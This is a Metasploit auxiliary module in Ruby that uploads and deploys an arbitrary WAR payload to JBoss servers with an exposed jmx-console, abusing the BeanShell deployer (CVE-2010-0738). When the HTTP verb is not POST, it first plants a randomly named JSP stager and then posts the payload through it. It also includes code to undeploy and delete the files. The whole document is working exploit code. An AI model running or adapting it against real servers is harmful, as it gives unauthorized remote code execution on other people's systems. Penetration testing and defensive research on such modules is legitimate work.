##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::HTTP::JBoss

  def initialize
    super(
      'Name'            => 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',
      'Description' => %q{
          This module can be used to install a WAR file payload on JBoss servers that have
        an exposed "jmx-console" application. The payload is put on the server by
        using the jboss.system:BSHDeployer\'s createScriptDeployment() method.
      },
      'Author'       =>
        [
          'us3r777 <us3r777[at]n0b0.so>'
        ],
      'License'     => BSD_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
          [ 'OSVDB', '64171' ],
          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],
        ]
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('APPBASE',    [ true,  'Application base name']),
        OptString.new('STAGERNAME', [ false, 'Only used if VERB is not POST (default: "stager")', 'stager']),
        OptString.new('WARFILE',    [ true,  'The WAR file to deploy']),
        OptBool.new('DEPLOY',       [ true,  'Deploy: true. Undeploy: false', true]),
      ], self.class)
  end

  def run
    app_base = datastore['APPBASE']
    stager_base = datastore['STAGERNAME'] || 'stager'
    stager_jsp_name = datastore['STAGERNAME'] || 'stager'

    uri = '/' + app_base + '/'
    if datastore['DEPLOY']
      # Read the WAR from the given file
      war_data = File.read(datastore['WARFILE'])
      encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
      if http_verb == 'POST' then
        print_status("Deploying payload...")
        opts = {
          :file => "#{app_base}.war",
          :contents => encoded_payload
        }
      else
        print_status("Deploying stager...")
        stager_base     = rand_text_alpha(8+rand(8))
        stager_jsp_name = rand_text_alpha(8+rand(8))
        stager_contents = stager_jsp(app_base)
        opts = {
          :dir => "#{stager_base}.war",
          :file => "#{stager_base}.war/#{stager_jsp_name}.jsp",
          :contents => Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
        }
      end
      bsh_payload = generate_bsh(:create, opts)
      package = deploy_bsh(bsh_payload)

      if package.nil?
        fail_with(Failure::Unknown, "Failed to deploy")
      end

      unless http_verb == 'POST'
        # now we call the stager to deploy our real payload war
        stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
        payload_data = "#{rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
        print_status("Calling stager #{stager_uri } to deploy final payload")
        res = deploy('method' => 'POST',
                     'data'   => payload_data,
                     'uri'    => stager_uri)
        unless res && res.code == 200
          fail_with(Failure::Unknown, "Failed to deploy")
        end
    end

    else
      # Undeploy the WAR and the stager if needed
      print_status("Undeploying #{uri} by deleting the WAR file via BSHDeployer...")

      files = {}
      unless http_verb == 'POST'
        files[:stager_jsp_name] = "#{stager_base}.war/#{stager_jsp_name}.jsp"
        files[:stager_base] = "#{stager_base}.war"
      end
      files[:app_base] = "#{app_base}.war"
      delete_script = generate_bsh(:delete, files)

      package = deploy_bsh(delete_script)
      if package.nil?
        print_warning("WARNING: Unable to remove WAR")
      end
    end
  end
end
